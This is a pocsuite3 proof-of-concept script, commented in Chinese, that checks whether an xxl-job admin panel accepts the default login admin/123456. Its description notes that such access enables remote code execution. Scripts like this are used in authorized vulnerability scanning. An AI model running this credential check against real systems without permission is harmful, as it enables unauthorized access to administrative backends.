from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)

# 关于类的继承
class XXLJOBPOC(POCBase):
    vulID = "0"  # ssvid ID 
    version = "1"  # 默认为1
    author = "xans"  # PoC作者的大名
    vulDate = "2022-10-16"  # 漏洞公开的时间
    createDate = "2022-10-16"  # 编写 PoC 的日期
    updateDate = "2022-10-16"  # PoC 更新的时间
    references = ["https://github.com/xuxueli/xxl-job"]  # 漏洞地址来源
    name = "xxl-job 后台存在弱口令漏洞 PoC"  # PoC 名称
    appPowerLink = "https://github.com/xuxueli/xxl-job"  # 漏洞厂商主页地址
    appName = "xxl-job"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """xxl-job后台管理存在弱口令,导致任意用户可以轻易爆破出来登录后台,通过后台的功能点远程代码执行。"""  
    pocDesc = """直接登录即可"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
        payload = {
            "userName": "admin",
            "password": "123456"
        }
        result = []
        try:
            url = self.url.strip() + "/login"  
            res = requests.post(url=url, headers=headers, data=payload, verify=False, timeout=9)
            data_dict = res.json()
            # 判断是否存在漏洞
            if data_dict.get("code") == 200 and data_dict.get("msg") == None:
                result.append(url)
        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check() 
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


# 其他自定义的可添加的功能函数
def other_fuc():
    pass

# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类 
register_poc(XXLJOBPOC)
